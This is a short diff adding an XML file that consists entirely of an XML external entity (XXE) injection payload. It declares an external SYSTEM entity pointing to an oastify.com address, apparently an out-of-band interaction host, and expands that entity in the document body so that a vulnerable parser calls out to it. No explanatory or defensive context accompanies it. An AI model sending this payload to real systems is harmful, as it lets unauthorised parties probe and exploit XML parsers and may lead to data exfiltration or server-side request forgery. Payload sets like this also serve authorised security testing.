@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "https://0z0oysv5i515dg4k67cfa15dj4pvdl1a.oastify.com" >
+]>
+<foo>&xxe;</foo>
